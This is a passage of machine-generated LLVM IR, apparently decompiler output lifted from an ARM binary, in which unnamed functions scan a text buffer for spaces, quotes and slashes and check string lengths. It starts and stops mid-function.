  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9788 = load i32, i32* %stack_var_-40, align 4
  %v1_978c = add i32 %v3_9788, 1
  store i32 %v1_978c, i32* %ip.global-to-local, align 4
  store i32 %v1_978c, i32* %stack_var_-40, align 4
  %v0_9794 = load i32, i32* @r6, align 4
  %v2_9794 = add i32 %v0_9794, %v1_978c
  %v3_9794 = inttoptr i32 %v2_9794 to i8*
  %v4_9794 = load i8, i8* %v3_9794, align 1
  %v6_9794 = zext i8 %v4_9794 to i32
  store i32 %v6_9794, i32* %r3.global-to-local, align 4
  %v2_9798 = icmp ugt i8 %v4_9794, 31
  store i1 %v2_9798, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9798 = icmp ult i8 %v4_9794, 32
  store i1 %v6_9798, i1* %cpsr_n.global-to-local, align 1
  %v7_9798 = icmp eq i8 %v4_9794, 32
  store i1 %v7_9798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9798, label %bb233, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_977c
  store i32 %v2_9794, i32* @r4, align 4
  br label %bb234

bb233:                                            ; preds = %dec_label_pc_977c
  %v2_979c = add i32 %v3_9788, 2
  store i32 %v2_979c, i32* %ip.global-to-local, align 4
  %v2_97a0 = add i32 %v0_9794, %v2_979c
  store i32 %v2_97a0, i32* @r4, align 4
  store i32 %v2_979c, i32* %stack_var_-40, align 4
  br label %bb234

bb234:                                            ; preds = %.thread56, %bb233
  %v0_97a8 = phi i32 [ %v2_9794, %.thread56 ], [ %v2_97a0, %bb233 ]
  store i32 %v0_97a8, i32* %r0.global-to-local, align 4
  %v1_97ac = inttoptr i32 %v0_97a8 to i8*
  %v2_97ac = call i32 @function_12cdc(i8* %v1_97ac)
  store i32 ptrtoint ([5 x i8]* @global_var_15f88.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_97ac, i32* @r1, align 4
  %v0_97b8 = load i32, i32* @r4, align 4
  store i32 %v0_97b8, i32* %r0.global-to-local, align 4
  %v4_97bc = inttoptr i32 %v0_97b8 to i8*
  %v5_97bc = call i32 @function_13030(i8* %v4_97bc, i32 %v2_97ac, i32 ptrtoint ([5 x i8]* @global_var_15f88.46 to i32))
  store i32 %v5_97bc, i32* %r0.global-to-local, align 4
  %v1_97c0 = add i32 %v5_97bc, 1
  %v2_97c0 = icmp eq i32 %v5_97bc, -1
  store i1 %v2_97c0, i1* %cpsr_c.global-to-local, align 1
  %v3_97c0 = sub i32 0, %v5_97bc
  %v4_97c0 = and i32 %v1_97c0, %v3_97c0
  %v5_97c0 = icmp slt i32 %v4_97c0, 0
  store i1 %v5_97c0, i1* %cpsr_v.global-to-local, align 1
  %v6_97c0 = icmp slt i32 %v1_97c0, 0
  store i1 %v6_97c0, i1* %cpsr_n.global-to-local, align 1
  %v7_97c0 = icmp eq i32 %v1_97c0, 0
  store i1 %v7_97c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97c0, label %.thread60, label %dec_label_pc_97d0

.thread60:                                        ; preds = %bb234
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v4_97c8 = load i32, i32* %v11_82f4, align 4
  store i32 %v4_97c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9804

dec_label_pc_97d0:                                ; preds = %bb234
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_97d4 = load i32, i32* %stack_var_-40, align 4
  %v0_97d8 = load i32, i32* @r6, align 4
  %v2_97d8 = add i32 %v0_97d8, %v3_97d4
  store i32 %v2_97d8, i32* @r4, align 4
  store i32 %v2_97d8, i32* %r0.global-to-local, align 4
  %v1_97e0 = inttoptr i32 %v2_97d8 to i8*
  %v2_97e0 = call i32 @function_12cdc(i8* %v1_97e0)
  store i32 ptrtoint ([5 x i8]* @global_var_15f88.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_97e0, i32* @r1, align 4
  %v0_97ec = load i32, i32* @r4, align 4
  store i32 %v0_97ec, i32* %r0.global-to-local, align 4
  %v4_97f0 = inttoptr i32 %v0_97ec to i8*
  %v5_97f0 = call i32 @function_13030(i8* %v4_97f0, i32 %v2_97e0, i32 ptrtoint ([5 x i8]* @global_var_15f88.46 to i32))
  store i32 %v5_97f0, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_97f8 = load i32, i32* %stack_var_-40, align 4
  %v2_97fc = add i32 %v3_97f8, %v5_97f0
  store i32 %v2_97fc, i32* %ip.global-to-local, align 4
  store i32 %v2_97fc, i32* %stack_var_-40, align 4
  br label %dec_label_pc_9804

dec_label_pc_9804:                                ; preds = %.thread60, %dec_label_pc_97d0
  %v0_9d8c = phi i32 [ %v4_97c8, %.thread60 ], [ %v2_97fc, %dec_label_pc_97d0 ]
  %v0_9804 = load i32, i32* @r6, align 4
  %v2_9804 = add i32 %v0_9804, %v0_9d8c
  %v3_9804 = inttoptr i32 %v2_9804 to i8*
  %v4_9804 = load i8, i8* %v3_9804, align 1
  %v6_9804 = zext i8 %v4_9804 to i32
  store i32 %v6_9804, i32* %r3.global-to-local, align 4
  %v2_9808 = icmp ugt i8 %v4_9804, 33
  store i1 %v2_9808, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9808 = icmp ult i8 %v4_9804, 34
  store i1 %v6_9808, i1* %cpsr_n.global-to-local, align 1
  %v7_9808 = icmp eq i8 %v4_9804, 34
  store i1 %v7_9808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9808, label %dec_label_pc_9d8c, label %dec_label_pc_9810

dec_label_pc_9810:                                ; preds = %dec_label_pc_9d8c, %dec_label_pc_9804, %dec_label_pc_9db4
  %v0_9810 = load i32, i32* @r6, align 4
  store i32 %v0_9810, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_9818 = inttoptr i32 %v0_9810 to i8*
  %v3_9818 = call i32 @function_12e08(i8* %v2_9818, i32 10)
  store i32 %v3_9818, i32* %r0.global-to-local, align 4
  %v1_981c = add i32 %v3_9818, -1
  store i32 %v1_981c, i32* %r3.global-to-local, align 4
  %v1_9820 = add i32 %v3_9818, -9
  %v2_9820 = icmp ugt i32 %v1_981c, 7
  store i1 %v2_9820, i1* %cpsr_c.global-to-local, align 1
  %v3_9820 = sub i32 8, %v3_9818
  %v4_9820 = and i32 %v3_9820, %v1_981c
  %v5_9820 = icmp slt i32 %v4_9820, 0
  store i1 %v5_9820, i1* %cpsr_v.global-to-local, align 1
  %v6_9820 = icmp slt i32 %v1_9820, 0
  store i1 %v6_9820, i1* %cpsr_n.global-to-local, align 1
  %v7_9820 = icmp eq i32 %v1_981c, 8
  store i1 %v7_9820, i1* %cpsr_z.global-to-local, align 1
  %v2_9824 = xor i1 %v2_9820, true
  %v3_9824 = or i1 %v7_9820, %v2_9824
  br i1 %v3_9824, label %dec_label_pc_9838.preheader, label %dec_label_pc_984c

dec_label_pc_9838.preheader:                      ; preds = %dec_label_pc_9810
  store i32 %v2_87d8, i32* %ip.global-to-local, align 4
  %v6_9828 = add i32 %v3_9818, %v2_87d8
  store i32 %v6_9828, i32* @r4, align 4
  br label %dec_label_pc_9838

dec_label_pc_9834:                                ; preds = %dec_label_pc_9838
  %v1_9834 = call i32 @function_14ac4(i32 1)
  store i32 %v1_9834, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9838

dec_label_pc_9838:                                ; preds = %dec_label_pc_9838.preheader, %dec_label_pc_9834
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_983c = call i32 @function_1396c(i32* null)
  %v1_9840 = load i32, i32* @r4, align 4
  %v2_9840 = sub i32 %v2_983c, %v1_9840
  %v3_9840 = icmp uge i32 %v2_983c, %v1_9840
  store i1 %v3_9840, i1* %cpsr_c.global-to-local, align 1
  %v4_9840 = xor i32 %v1_9840, %v2_983c
  %v5_9840 = xor i32 %v2_9840, %v2_983c
  %v6_9840 = and i32 %v5_9840, %v4_9840
  %v7_9840 = icmp slt i32 %v6_9840, 0
  store i1 %v7_9840, i1* %cpsr_v.global-to-local, align 1
  %v8_9840 = icmp slt i32 %v2_9840, 0
  store i1 %v8_9840, i1* %cpsr_n.global-to-local, align 1
  %v9_9840 = icmp eq i32 %v2_983c, %v1_9840
  store i1 %v9_9840, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v3_9840, label %dec_label_pc_984c, label %dec_label_pc_9834

dec_label_pc_984c:                                ; preds = %dec_label_pc_9838, %dec_label_pc_9810
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9850 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9850, i32* @r4, align 4
  %v0_9854 = load i32, i32* @r6, align 4
  %v2_9854 = add i32 %v0_9854, %v3_9850
  store i32 %v2_9854, i32* @r5, align 4
  store i32 %v2_9854, i32* %r0.global-to-local, align 4
  %v1_985c = inttoptr i32 %v2_9854 to i8*
  %v2_985c = call i32 @function_12cdc(i8* %v1_985c)
  store i32 ptrtoint ([5 x i8]* @global_var_15f80.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_985c, i32* @r1, align 4
  %v0_9868 = load i32, i32* @r5, align 4
  store i32 %v0_9868, i32* %r0.global-to-local, align 4
  %v4_986c = inttoptr i32 %v0_9868 to i8*
  %v5_986c = call i32 @function_13030(i8* %v4_986c, i32 %v2_985c, i32 ptrtoint ([5 x i8]* @global_var_15f80.44 to i32))
  store i32 %v5_986c, i32* %r0.global-to-local, align 4
  %v1_9870 = add i32 %v5_986c, -4
  %v2_9870 = icmp ugt i32 %v5_986c, 3
  store i1 %v2_9870, i1* %cpsr_c.global-to-local, align 1
  %v3_9870 = sub i32 3, %v5_986c
  %v4_9870 = and i32 %v3_9870, %v5_986c
  %v5_9870 = icmp slt i32 %v4_9870, 0
  store i1 %v5_9870, i1* %cpsr_v.global-to-local, align 1
  %v6_9870 = icmp slt i32 %v1_9870, 0
  store i1 %v6_9870, i1* %cpsr_n.global-to-local, align 1
  %v7_9870 = icmp eq i32 %v5_986c, 4
  store i1 %v7_9870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9870, label %dec_label_pc_9c68, label %dec_label_pc_9878

dec_label_pc_9878:                                ; preds = %dec_label_pc_984c
  %v0_9878 = load i32, i32* @r6, align 4
  %v1_9878 = load i32, i32* @r4, align 4
  %v2_9878 = add i32 %v1_9878, %v0_9878
  %v3_9878 = inttoptr i32 %v2_9878 to i8*
  %v4_9878 = load i8, i8* %v3_9878, align 1
  %v6_9878 = zext i8 %v4_9878 to i32
  store i32 %v6_9878, i32* %r3.global-to-local, align 4
  %v2_987c = icmp ugt i8 %v4_9878, 46
  store i1 %v2_987c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_987c = icmp ult i8 %v4_9878, 47
  store i1 %v6_987c, i1* %cpsr_n.global-to-local, align 1
  %v7_987c = icmp eq i8 %v4_9878, 47
  store i1 %v7_987c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_987c, label %dec_label_pc_9de0, label %dec_label_pc_9884

dec_label_pc_9884:                                ; preds = %dec_label_pc_9dfc, %dec_label_pc_9de0, %dec_label_pc_9d38, %dec_label_pc_9d1c, %dec_label_pc_9878, %dec_label_pc_9e2c, %dec_label_pc_9d68
  %v0_9884 = load i32, i32* %sb.global-to-local, align 4
  %v1_9888 = add i32 %v0_9884, 1431
  store i32 %v1_9888, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_15f5c.21 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v4_9894 = call i32 @function_13cb0(i32 %v1_9888, i32 ptrtoint ([4 x i8]* @global_var_15f5c.21 to i32), i32 4)
  store i32 %v4_9894, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_989c = load i32, i32* @r8, align 4
  %v3_989c = add i32 %v2_989c, -1452
  %v4_989c = inttoptr i32 %v3_989c to i8*
  store i8 10, i8* %v4_989c, align 1
  br label %dec_label_pc_8838

dec_label_pc_98a4:                                ; preds = %dec_label_pc_8610
  store i32 %v1_8610, i32* %r3.global-to-local, align 4
  %v1_98a8 = trunc i32 %v1_8610 to i8
  store i8 %v1_98a8, i8* %v2_8650, align 1
  %v0_98ac = load i32, i32* @r6, align 4
  %v1_98ac = add i32 %v0_98ac, -1431
  %v2_98ac = inttoptr i32 %v1_98ac to i32*
  %v3_98ac = load i32, i32* %v2_98ac, align 4
  store i32 %v3_98ac, i32* %r0.global-to-local, align 4
  %v1_98b0 = call i32 @function_1369c(i32 %v3_98ac)
  store i32 %v1_98b0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_98b8 = load i32, i32* @r6, align 4
  %v2_98b8 = add i32 %v1_98b8, -1431
  %v3_98b8 = inttoptr i32 %v2_98b8 to i32*
  store i32 -1, i32* %v3_98b8, align 4
  br label %dec_label_pc_8630

dec_label_pc_98c0:                                ; preds = %dec_label_pc_9774, %dec_label_pc_96a4, %dec_label_pc_9678
  %v0_98c0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_98c0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15f74.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v5_98d0 = call i32 @function_12da0(i32 %v2_8280, i32 %v0_98c0, i32 ptrtoint ([5 x i8]* @global_var_15f74.40 to i32), i32 4)
  %v0_98d4 = load i32, i32* %sb.global-to-local, align 4
  %v1_98d8 = add i32 %v0_98d4, 1431
  store i32 %v1_98d8, i32* @r4, align 4
  store i32 %v5_98d0, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15f90.48 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_98d8, i32* %r0.global-to-local, align 4
  %v3_98e8 = inttoptr i32 %v1_98d8 to i8*
  %v4_98e8 = call i32 @function_130bc(i8* %v3_98e8, i32 ptrtoint ([5 x i8]* @global_var_15f90.48 to i32))
  store i32 %v4_98e8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_98ec = icmp slt i32 %v4_98e8, 0
  store i1 %v1_98ec, i1* %cpsr_n.global-to-local, align 1
  %v2_98ec = icmp eq i32 %v4_98e8, 0
  store i1 %v2_98ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_98ec, label %dec_label_pc_9aa8, label %dec_label_pc_98f4

dec_label_pc_98f4:                                ; preds = %dec_label_pc_9aa8, %dec_label_pc_98c0
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_98f8 = load i32, i32* @r8, align 4
  %v3_98f8 = add i32 %v2_98f8, -1452
  %v4_98f8 = inttoptr i32 %v3_98f8 to i8*
  store i8 7, i8* %v4_98f8, align 1
  br label %dec_label_pc_98fc

dec_label_pc_98fc:                                ; preds = %bb240, %dec_label_pc_98f4
  %v0_98fc = load i32, i32* @r5, align 4
  store i32 %v0_98fc, i32* %r2.global-to-local, align 4
  %v0_9900 = load i32, i32* @r8, align 4
  %v1_9900 = add i32 %v0_9900, -1456
  %v2_9900 = inttoptr i32 %v1_9900 to i32*
  %v3_9900 = load i32, i32* %v2_9900, align 4
  store i32 %v3_9900, i32* %r0.global-to-local, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_990c = call i32 @function_13ea0(i32 %v3_9900, i32* nonnull %stack_var_-20809, i32 %v0_98fc, i32 16384)
  store i32 %v5_990c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8838

dec_label_pc_9914:                                ; preds = %dec_label_pc_8e04
  %v2_9914 = add i32 %v0_9914, -10240
  %v3_9914 = icmp ugt i32 %v0_9914, 10239
  store i1 %v3_9914, i1* %cpsr_c.global-to-local, align 1
  %v4_9914 = sub i32 10239, %v0_9914
  %v5_9914 = and i32 %v4_9914, %v0_9914
  %v6_9914 = icmp slt i32 %v5_9914, 0
  store i1 %v6_9914, i1* %cpsr_v.global-to-local, align 1
  %v7_9914 = icmp slt i32 %v2_9914, 0
  store i1 %v7_9914, i1* %cpsr_n.global-to-local, align 1
  %v8_9914 = icmp eq i32 %v0_9914, 10240
  store i1 %v8_9914, i1* %cpsr_z.global-to-local, align 1
  %v5_9918 = icmp slt i32 %v0_9914, 10240
  br i1 %v5_9918, label %dec_label_pc_8838, label %dec_label_pc_8e20

dec_label_pc_9920:                                ; preds = %dec_label_pc_9628
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_9924 = load i32, i32* @r4, align 4
  %v2_9924 = inttoptr i32 %v1_9924 to i32*
  store i32 104, i32* %v2_9924, align 4
  br label %dec_label_pc_965c

dec_label_pc_992c:                                ; preds = %dec_label_pc_9430
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_9930 = load i32, i32* %fp.global-to-local, align 4
  %v2_9930 = inttoptr i32 %v1_9930 to i32*
  store i32 104, i32* %v2_9930, align 4
  br label %dec_label_pc_9934

dec_label_pc_9934:                                ; preds = %dec_label_pc_9950, %dec_label_pc_992c
  %v0_9934 = load i32, i32* @r8, align 4
  %v1_9934 = add i32 %v0_9934, -1456
  %v2_9934 = inttoptr i32 %v1_9934 to i32*
  %v3_9934 = load i32, i32* %v2_9934, align 4
  store i32 %v3_9934, i32* %r0.global-to-local, align 4
  %v1_9938 = call i32 @function_1369c(i32 %v3_9934)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_9944 = load i32, i32* @r8, align 4
  %v2_9944 = add i32 %v1_9944, -1456
  %v3_9944 = inttoptr i32 %v2_9944 to i32*
  store i32 -1, i32* %v3_9944, align 4
  %v0_9948 = load i32, i32* %lr.global-to-local, align 4
  %v1_9948 = trunc i32 %v0_9948 to i8
  %v2_9948 = load i32, i32* @r8, align 4
  %v3_9948 = add i32 %v2_9948, -1452
  %v4_9948 = inttoptr i32 %v3_9948 to i8*
  store i8 %v1_9948, i8* %v4_9948, align 1
  br label %dec_label_pc_8838

dec_label_pc_9950:                                ; preds = %dec_label_pc_9458
  %v0_9950 = load i32, i32* %fp.global-to-local, align 4
  %v1_9950 = inttoptr i32 %v0_9950 to i32*
  %v2_9950 = load i32, i32* %v1_9950, align 4
  store i32 %v2_9950, i32* %r3.global-to-local, align 4
  %v1_9954 = add i32 %v2_9950, -11
  %v2_9954 = icmp ugt i32 %v2_9950, 10
  store i1 %v2_9954, i1* %cpsr_c.global-to-local, align 1
  %v3_9954 = sub i32 10, %v2_9950
  %v4_9954 = and i32 %v3_9954, %v2_9950
  %v5_9954 = icmp slt i32 %v4_9954, 0
  store i1 %v5_9954, i1* %cpsr_v.global-to-local, align 1
  %v6_9954 = icmp slt i32 %v1_9954, 0
  store i1 %v6_9954, i1* %cpsr_n.global-to-local, align 1
  %v7_9954 = icmp eq i32 %v2_9950, 11
  store i1 %v7_9954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9954, label %dec_label_pc_8838, label %dec_label_pc_9934

dec_label_pc_9960:                                ; preds = %bb230
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_996c = load i32, i32* @r5, align 4
  %v1_996c = add i32 %v0_996c, 4
  %v2_996c = inttoptr i32 %v1_996c to i8*
  %v3_996c = load i8, i8* %v2_996c, align 1
  %v4_996c = zext i8 %v3_996c to i32
  store i32 %v4_996c, i32* %r3.global-to-local, align 4
  %v2_9970 = icmp ugt i8 %v3_996c, 114
  store i1 %v2_9970, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9970 = icmp ult i8 %v3_996c, 115
  store i1 %v6_9970, i1* %cpsr_n.global-to-local, align 1
  %v7_9970 = icmp eq i8 %v3_996c, 115
  store i1 %v7_9970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9970, label %bb235, label %.thread63

bb235:                                            ; preds = %dec_label_pc_9960
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_9960, %bb235
  %v3_9980 = phi i32 [ 7, %dec_label_pc_9960 ], [ 8, %bb235 ]
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 %v0_996c, i32* @r0, align 4
  %v1_9988 = load i32, i32* %r6.global-to-local, align 4
  %v2_9988 = sub i32 %v1_9988, %v3_9980
  store i32 %v2_9988, i32* @r2, align 4
  %v2_998c = add i32 %v3_9980, %v0_996c
  store i32 %v2_998c, i32* @r1, align 4
  %v3_9990 = call i32 @function_13cc0(i32 %v0_996c, i32 %v2_998c, i32 %v2_9988)
  store i32 %v3_9990, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v0_9998 = load i32, i32* @r7, align 4
  store i32 %v0_9998, i32* %stack_var_-40, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  %v1_99a0 = load i32, i32* @r4, align 4
  %v2_99a0 = add i32 %v1_99a0, %v2_8280
  %v3_99a0 = inttoptr i32 %v2_99a0 to i8*
  %v4_99a0 = load i8, i8* %v3_99a0, align 1
  %v6_99a0 = zext i8 %v4_99a0 to i32
  store i32 %v6_99a0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_99a4 = icmp eq i8 %v4_99a0, 0
  store i1 %v2_99a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99a4, label %dec_label_pc_99e8, label %dec_label_pc_99ac

dec_label_pc_99ac:                                ; preds = %.thread63
  %v2_99ac = icmp ugt i8 %v4_99a0, 46
  store i1 %v2_99ac, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_99ac = icmp ult i8 %v4_99a0, 47
  store i1 %v6_99ac, i1* %cpsr_n.global-to-local, align 1
  %v7_99ac = icmp eq i8 %v4_99a0, 47
  store i1 %v7_99ac, i1* %cpsr_z.global-to-local, align 1
  %v1_99b0 = load i32, i32* @r5, align 4
  br i1 %v7_99ac, label %bb236, label %dec_label_pc_99b8

bb236:                                            ; preds = %dec_label_pc_99ac
  store i32 %v1_99b0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9b48

dec_label_pc_99b8:                                ; preds = %dec_label_pc_99ac
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_99c8

dec_label_pc_99c0:                                ; preds = %dec_label_pc_99c8
  %v2_99c0 = icmp ugt i8 %v4_99d4, 46
  store i1 %v2_99c0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_99c0 = icmp ult i8 %v4_99d4, 47
  store i1 %v6_99c0, i1* %cpsr_n.global-to-local, align 1
  %v7_99c0 = icmp eq i8 %v4_99d4, 47
  store i1 %v7_99c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_99c0, label %dec_label_pc_9b48, label %dec_label_pc_99c8

dec_label_pc_99c8:                                ; preds = %dec_label_pc_99c0, %dec_label_pc_99b8
  %v0_99dc = phi i32 [ %v1_99dc, %dec_label_pc_99c0 ], [ 1, %dec_label_pc_99b8 ]
  store i32 %v0_99dc, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 %v0_99dc, i32* %stack_var_-40, align 4
  %v2_99d4 = add i32 %v0_99dc, %v1_99b0
  %v3_99d4 = inttoptr i32 %v2_99d4 to i8*
  %v4_99d4 = load i8, i8* %v3_99d4, align 1
  %v6_99d4 = zext i8 %v4_99d4 to i32
  store i32 %v6_99d4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_99d8 = icmp eq i8 %v4_99d4, 0
  store i1 %v2_99d8, i1* %cpsr_z.global-to-local, align 1
  %v1_99dc = add i32 %v0_99dc, 1
  store i32 %v1_99dc, i32* %r3.global-to-local, align 4
  store i32 %v2_99d4, i32* %r1.global-to-local, align 4
  br i1 %v2_99d8, label %dec_label_pc_99e8, label %dec_label_pc_99c0

dec_label_pc_99e8:                                ; preds = %dec_label_pc_99c8, %.thread63, %dec_label_pc_9b48
  %v0_99e8 = load i32, i32* @r5, align 4
  store i32 %v0_99e8, i32* %r0.global-to-local, align 4
  %v1_99ec = inttoptr i32 %v0_99e8 to i8*
  %v2_99ec = call i32 @function_12cdc(i8* %v1_99ec)
  store i32 %v2_99ec, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_99f0 = icmp slt i32 %v2_99ec, 0
  store i1 %v1_99f0, i1* %cpsr_n.global-to-local, align 1
  %v2_99f0 = icmp eq i32 %v2_99ec, 0
  store i1 %v2_99f0, i1* %cpsr_z.global-to-local, align 1
  %tmp237 = icmp slt i32 %v2_99ec, 1
  br i1 %tmp237, label %dec_label_pc_9a14, label %dec_label_pc_99f8

dec_label_pc_99f8:                                ; preds = %dec_label_pc_99e8
  %v0_99f8 = load i32, i32* @r5, align 4
  store i32 %v0_99f8, i32* %r0.global-to-local, align 4
  %v1_99fc = inttoptr i32 %v0_99f8 to i8*
  %v2_99fc = call i32 @function_12cdc(i8* %v1_99fc)
  store i32 %v2_99fc, i32* %r0.global-to-local, align 4
  %v1_9a00 = add i32 %v2_99fc, -127
  %v2_9a00 = icmp ugt i32 %v2_99fc, 126
  store i1 %v2_9a00, i1* %cpsr_c.global-to-local, align 1
  %v3_9a00 = sub i32 126, %v2_99fc
  %v4_9a00 = and i32 %v3_9a00, %v2_99fc
  %v5_9a00 = icmp slt i32 %v4_9a00, 0
  store i1 %v5_9a00, i1* %cpsr_v.global-to-local, align 1
  %v6_9a00 = icmp slt i32 %v1_9a00, 0
  store i1 %v6_9a00, i1* %cpsr_n.global-to-local, align 1
  %v7_9a00 = icmp eq i32 %v2_99fc, 127
  store i1 %v7_9a00, i1* %cpsr_z.global-to-local, align 1
  %v7_9a04 = icmp sgt i32 %v2_99fc, 127
  br i1 %v7_9a04, label %.thread66, label %bb238

bb238:                                            ; preds = %dec_label_pc_99f8
  %v8_9a04 = load i32, i32* %sb.global-to-local, align 4
  %v9_9a08 = add i32 %v8_9a04, 789
  store i32 %v9_9a08, i32* %r0.global-to-local, align 4
  %v8_9a0c = load i32, i32* @r5, align 4
  store i32 %v8_9a0c, i32* %r1.global-to-local, align 4
  br label %.thread66

.thread66:                                        ; preds = %dec_label_pc_99f8, %bb238
  store i32 39444, i32* %lr.global-to-local, align 4
  %v3_9a10 = xor i1 %v6_9a00, %v5_9a00
  %v4_9a10 = or i1 %v7_9a00, %v3_9a10
  call void @__pseudo_cond_branch(i1 %v4_9a10, i32 ptrtoint (i32* @global_var_12d04.49 to i32))
  br label %dec_label_pc_9a14

dec_label_pc_9a14:                                ; preds = %dec_label_pc_99e8, %.thread66
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9a18 = load i32, i32* %stack_var_-40, align 4
  %v0_9a1c = load i32, i32* @r5, align 4
  %v2_9a1c = add i32 %v3_9a18, 1
  %v1_9a20 = add i32 %v2_9a1c, %v0_9a1c
  store i32 %v1_9a20, i32* %r0.global-to-local, align 4
  %v1_9a24 = inttoptr i32 %v1_9a20 to i8*
  %v2_9a24 = call i32 @function_12cdc(i8* %v1_9a24)
  store i32 %v2_9a24, i32* %r0.global-to-local, align 4
  %v1_9a28 = add i32 %v2_9a24, -255
  %v2_9a28 = icmp ugt i32 %v2_9a24, 254
  store i1 %v2_9a28, i1* %cpsr_c.global-to-local, align 1
  %v3_9a28 = sub i32 254, %v2_9a24
  %v4_9a28 = and i32 %v3_9a28, %v2_9a24
  %v5_9a28 = icmp slt i32 %v4_9a28, 0
  store i1 %v5_9a28, i1* %cpsr_v.global-to-local, align 1
  %v6_9a28 = icmp slt i32 %v1_9a28, 0
  store i1 %v6_9a28, i1* %cpsr_n.global-to-local, align 1
  %v7_9a28 = icmp eq i32 %v2_9a24, 255
  store i1 %v7_9a28, i1* %cpsr_z.global-to-local, align 1
  %v8_9a2c = icmp sgt i32 %v2_9a24, 255
  br i1 %v8_9a2c, label %dec_label_pc_9400, label %dec_label_pc_9a30

dec_label_pc_9a30:                                ; preds = %dec_label_pc_9a14
  %v0_9a30 = load i32, i32* %sb.global-to-local, align 4
  %v1_9a34 = add i32 %v0_9a30, 533
  store i32 %v1_9a34, i32* @r4, align 4
  store i32 %v1_9a34, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9a40 = call i32 @function_12d7c(i32 %v1_9a34, i32 255)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9a48 = load i32, i32* %stack_var_-40, align 4
  %v0_9a4c = load i32, i32* @r5, align 4
  %v2_9a4c = add i32 %v3_9a48, 1
  %v1_9a50 = add i32 %v2_9a4c, %v0_9a4c
  store i32 %v1_9a50, i32* %r0.global-to-local, align 4
  %v1_9a54 = inttoptr i32 %v1_9a50 to i8*
